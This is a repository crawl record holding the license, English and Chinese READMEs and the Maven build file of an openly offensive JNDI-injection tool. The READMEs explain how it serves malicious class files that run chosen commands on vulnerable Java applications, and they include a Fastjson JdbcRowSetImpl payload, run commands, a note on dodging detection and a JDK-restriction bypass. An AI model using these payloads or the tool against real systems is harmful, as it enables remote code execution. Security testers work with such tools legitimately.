{
  "metadata": {
    "timestamp": 1736708509565,
    "page": 713,
    "hasNextPage": true,
    "endCursor": "Y3Vyc29yOjczMA==",
    "completionStatus": "IN_PROGRESS"
  },
  "repositories": [
    {
      "nameWithOwner": "welk1n/JNDI-Injection-Exploit",
      "stars": 2628,
      "defaultBranch": "master",
      "files": [
        {
          "name": "LICENSE",
          "type": "blob",
          "size": 1.0380859375,
          "content": "MIT License\n\nCopyright (c) 2019 welk1n\n\nPermission is hereby granted, free of charge, to any person obtaining a copy\nof this software and associated documentation files (the \"Software\"), to deal\nin the Software without restriction, including without limitation the rights\nto use, copy, modify, merge, publish, distribute, sublicense, and/or sell\ncopies of the Software, and to permit persons to whom the Software is\nfurnished to do so, subject to the following conditions:\n\nThe above copyright notice and this permission notice shall be included in all\ncopies or substantial portions of the Software.\n\nTHE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\nIMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\nFITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\nAUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\nLIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\nOUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE\nSOFTWARE.\n"
        },
        {
          "name": "README-CN.md",
          "type": "blob",
          "size": 3.3251953125,
          "content": "## 介绍\n\nJNDI注入利用工具，生成JNDI链接并启动后端相关服务，可用于Fastjson、Jackson等相关漏洞的验证。\n\n## 使用\n\n可执行程序为jar包，在命令行中运行以下命令：\n\n```shell\n$ java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar [-C] [command] [-A] [address]\n```\n\n其中:\n\n- **-C** - 远程class文件中要执行的命令。\n\n  （可选项 , 默认命令是mac下打开计算器，即\"open /Applications/Calculator.app\"）\n\n- **-A** - 服务器地址，可以是IP地址或者域名。\n\n  （可选项 , 默认地址是第一个网卡地址）\n\n注意:\n\n- 要确保 **1099**、**1389**、**8180**端口可用，不被其他程序占用。\n\n  或者你也可以在run.ServerStart类26~28行更改默认端口。\n\n- 命令会被作为参数传入**Runtime.getRuntime().exec()**，\n\n  所以需要确保命令传入exec()方法可执行。\n  \n  **bash等可在shell直接执行的相关命令需要加双引号，比如说 java -jar JNDI.jar -C \"bash -c ...\"**\n\n## 示例\n\n### 本地演示：\n\n1. 启动 JNDI-Injection-Exploit：\n\n   ```shell\n   $ java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C \"open /Applications/Calculator.app\" -A \"127.0.0.1\"\n   ```\n\n    截图：\n    ![](https://github.com/welk1n/JNDI-Injection-Exploit/blob/master/screenshots/1.png)\n\n\n2. 我们需要把第一步中生成的 JNDI链接注入到存在漏洞的应用环境中，方便解释用如下代码模仿漏洞环境：\n\n   ```java\n   public static void main(String[] args) throws Exception{\n       InitialContext ctx = new InitialContext();\n       ctx.lookup(\"rmi://127.0.0.1/fgf4fp\");\n   }\n   ```\n\n   当上面代码运行后，应用便会执行相应命令，这里是弹出计算器，没截图，可以自己测一下。\n\n   截图是工具的server端日志：\n\n    ![](https://github.com/welk1n/JNDI-Injection-Exploit/blob/master/screenshots/2.png)\n\n\n\n## 安装\n\n下面两种方法都可以得到Jar包\n\n1. 从 [Realease](https://github.com/welk1n/JNDI-Injection-Exploit/releases)直接下载最新的Jar。\n\n2. 把源码下载到本地然后自行编译打包。（在Java1.7+ 、Java1.8+ 和 Maven 3.x+环境下测试可以）\n\n   ```shell\n   $ git clone https://github.com/welk1n/JNDI-Injection-Exploit.git\n   ```\n\n   ```shell\n   $ cd JNDI-Injection-Exploit\n   ```\n\n   ```shell\n   $ mvn clean package -DskipTests\n   ```\n\n## 工具实现\n\n1. 首先生成的链接后面codebaseClass是6位随机的，这个是因为不希望让工具生成的链接本身成为一种特征被监控或拦截。\n2. 服务器地址实际就是codebase地址，相比于marshalsec中的JNDI server来说，这个工具把JNDI server和HTTP server绑定到一起，并自动启动HTTP server返回相应class，更自动化了。\n3. HTTP server基于jetty实现的，本质上是一个能下载文件的servlet，比较有意思的是我提前编译好class模板放到resource目录，然后servlet会读取class文件，使用ASM框架对读取的字节码进行修改，然后插入我们想要执行的命令，返回修改后的字节码。\n\n## 待实现\n\n- （已完成EL表达式绕过部分）在更高版本的JDK环境中trustURLCodebase变量为false，限制了远程类的加载，我会找时间把[JNDI-Injection-Bypass](https://github.com/welk1n/JNDI-Injection-Bypass)这个项目的东西融入到本项目中，生成能绕过JDK限制JNDI链接。\n- … ...\n"
        },
        {
          "name": "README.md",
          "type": "blob",
          "size": 3.533203125,
          "content": "# JNDI-Injection-Exploit\n\n[Materials about JNDI Injection](https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf)\n\n[中文文档](https://github.com/welk1n/JNDI-Injection-Exploit/blob/master/README-CN.md)\n\n[相关文章](https://www.cnblogs.com/Welk1n/p/11066397.html)\n\n## Description\n\nJNDI-Injection-Exploit is a tool for generating workable JNDI links and provide background services by starting RMI server,LDAP server and HTTP server. RMI server and LDAP server are based on  [marshals](https://github.com/mbechler/marshalsec) and modified further to link with HTTP server. \n\nUsing this tool allows you get JNDI links, you can insert these links into your **POC** to test vulnerability. \n\nFor example, this is a Fastjson vul-poc:\n\n```json\n{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://127.0.0.1:1099/Object\",\"autoCommit\":true}\n```\n\nWe can replace  \"rmi://127.0.0.1:1099/Object\" with the link generated by JNDI-Injection-Exploit to test vulnerability. \n\n## Disclaimer\n\nAll information and code is provided solely for educational purposes and/or testing your own systems for these vulnerabilities.\n\n## Usage\n\n Run as\n\n```shell\n$ java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar [-C] [command] [-A] [address]\n```\n\nwhere:\n\n- **-C** - command executed in the remote classfile.\n\n  (optional , default command is \"open /Applications/Calculator.app\")\n\n- **-A** - the address of your server, maybe an IP address or a domain.\n\n  (optional , default address is the first network interface address)\n\nPoints for attention:\n\n- make sure your server's ports (**1099**, **1389**, **8180**) are available .\n\n  or you can change the default port in the run.ServerStart class line 26~28.\n\n- your command is passed to **Runtime.getRuntime().exec()** as parameters, \n\n  so you need to ensure your command is workable in method exec().\n  \n  **Command in bash like \"bash -c ....\" need to add Double quotes.**\n\n## Examples\n\n Local demo:\n\n1. Start the tool like this:\n\n   ```shell\n   $ java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C \"open /Applications/Calculator.app\" -A \"127.0.0.1\"\n   ```\n\n    Screenshot:\n\n   ![image-20191018154346759](https://github.com/welk1n/JNDI-Injection-Exploit/blob/master/screenshots/1.png)\n\n2. Assume that we inject the JNDI links like rmi://ADDRESS/jfxllc generated in step 1 to a vulnerable application which can be attacked by JNDI injection.\n\n   In this example, it looks like this:\n\n   ```java\n   public static void main(String[] args) throws Exception{\n       InitialContext ctx = new InitialContext();\n       ctx.lookup(\"rmi://127.0.0.1/fgf4fp\");\n   }\n   ```\n\n   then when we run this code, the command will be executed ,\n\n   and the log will be printed in shell:\n\n   ![image-20191018154515787](https://github.com/welk1n/JNDI-Injection-Exploit/blob/master/screenshots/2.png)\n\n\n\n## Installation\n\nWe can select one of the two methods to get the jar.\n\n1. Download the latest jar from [Realease](https://github.com/welk1n/JNDI-Injection-Exploit/releases/download/v1.0/JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar).\n\n2. Clone the source code to local and build (Requires Java 1.8+ and Maven 3.x+).\n\n   ```shell\n   $ git clone https://github.com/welk1n/JNDI-Injection-Exploit.git\n   ```\n\n   ```shell\n   $ cd JNDI-Injection-Exploit\n   ```\n\n   ```shell\n   $ mvn clean package -DskipTests\n   ```\n\n## To do\n\n- (**Done**)Combine this project and [JNDI-Injection-Bypass](https://github.com/welk1n/JNDI-Injection-Bypass) to generate workable links when **trustURLCodebase is false** in higher versions of JDK by default.\n- … ...\n"
        },
        {
          "name": "pom.xml",
          "type": "blob",
          "size": 4.609375,
          "content": "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<project xmlns=\"http://maven.apache.org/POM/4.0.0\"\n         xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n         xsi:schemaLocation=\"http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd\">\n    <modelVersion>4.0.0</modelVersion>\n\n    <groupId>welk1n</groupId>\n    <artifactId>JNDI-Injection-Exploit</artifactId>\n    <version>1.0-SNAPSHOT</version>\n\n    <properties>\n        <project.build.sourceEncoding>UTF-8</project.build.sourceEncoding>\n        <jetty.version>8.1.9.v20130131</jetty.version>\n        <compiler.version>1.8</compiler.version>\n    </properties>\n\n\n    <dependencies>\n        <!-- Util -->\n        <dependency>\n            <groupId>org.ow2.asm</groupId>\n            <artifactId>asm</artifactId>\n            <version>7.1</version>\n        </dependency>\n\n        <dependency>\n            <groupId>org.javassist</groupId>\n            <artifactId>javassist</artifactId>\n            <version>3.19.0-GA</version>\n        </dependency>\n\n        <dependency>\n            <groupId>org.reflections</groupId>\n            <artifactId>reflections</artifactId>\n            <version>0.9.9</version>\n        </dependency>\n\n        <dependency>\n            <groupId>org.slf4j</groupId>\n            <artifactId>slf4j-nop</artifactId>\n            <version>1.7.24</version>\n        </dependency>\n\n        <dependency>\n            <groupId>org.apache.commons</groupId>\n            <artifactId>commons-lang3</artifactId>\n            <version>3.4</version>\n        </dependency>\n\n        <dependency>\n            <groupId>commons-cli</groupId>\n            <artifactId>commons-cli</artifactId>\n            <version>1.3</version>\n        </dependency>\n\n\n        <!-- For LDAP reference jndi -->\n        <dependency>\n            <groupId>com.unboundid</groupId>\n            <artifactId>unboundid-ldapsdk</artifactId>\n            <version>3.1.1</version>\n        </dependency>\n\n        <!-- Jetty -->\n        <dependency>\n            <groupId>org.eclipse.jetty.aggregate</groupId>\n            <artifactId>jetty-webapp</artifactId>\n            <version>${jetty.version}</version>\n        </dependency>\n\n        <!-- Bypass JDK 1.8.0_191+ -->\n<!--        <dependency>-->\n<!--            <groupId>org.springframework.boot</groupId>-->\n<!--            <artifactId>spring-boot-starter-web</artifactId>-->\n<!--            <version>2.1.1.RELEASE</version>-->\n<!--        </dependency>-->\n\n        <dependency>\n            <groupId>org.apache.tomcat</groupId>\n            <artifactId>tomcat-catalina</artifactId>\n            <version>8.5.38</version>\n        </dependency>\n        <dependency>\n            <groupId>org.apache.tomcat</groupId>\n            <artifactId>tomcat-jasper-el</artifactId>\n            <version>8.5.38</version>\n        </dependency>\n<!--        <dependency>-->\n<!--            <groupId>org.codehaus.groovy</groupId>-->\n<!--            <artifactId>groovy</artifactId>-->\n<!--            <version>2.4.5</version>-->\n<!--        </dependency>-->\n\n        <!-- test -->\n        <dependency>\n            <groupId>junit</groupId>\n            <artifactId>junit</artifactId>\n            <version>4.12</version>\n            <scope>test</scope>\n        </dependency>\n    </dependencies>\n\n\n    <build>\n        <plugins>\n            <plugin>\n                <groupId>org.apache.maven.plugins</groupId>\n                <artifactId>maven-compiler-plugin</artifactId>\n                <configuration>\n                    <source>${compiler.version}</source>\n                    <target>${compiler.version}</target>\n                </configuration>\n            </plugin>\n\n            <plugin>\n                <artifactId>maven-assembly-plugin</artifactId>\n                <version>2.5.5</version>\n                <configuration>\n                    <finalName>${project.artifactId}-${project.version}-all</finalName>\n                    <appendAssemblyId>false</appendAssemblyId>\n                    <descriptorRefs>\n                        <descriptorRef>jar-with-dependencies</descriptorRef>\n                    </descriptorRefs>\n                    <archive>\n                        <manifest>\n                            <mainClass>run.ServerStart</mainClass>\n                        </manifest>\n                    </archive>\n                </configuration>\n                <executions>\n                    <execution>\n                        <id>make-assembly</id>\n                        <phase>package</phase>\n                        <goals>\n                            <goal>single</goal>\n                        </goals>\n                    </execution>\n                </executions>\n            </plugin>\n        </plugins>\n    </build>\n\n</project>"
        },
        {
          "name": "screenshots",
          "type": "tree",
          "content": null
        },
        {
          "name": "src",
          "type": "tree",
          "content": null
        }
      ]
    }
  ]
}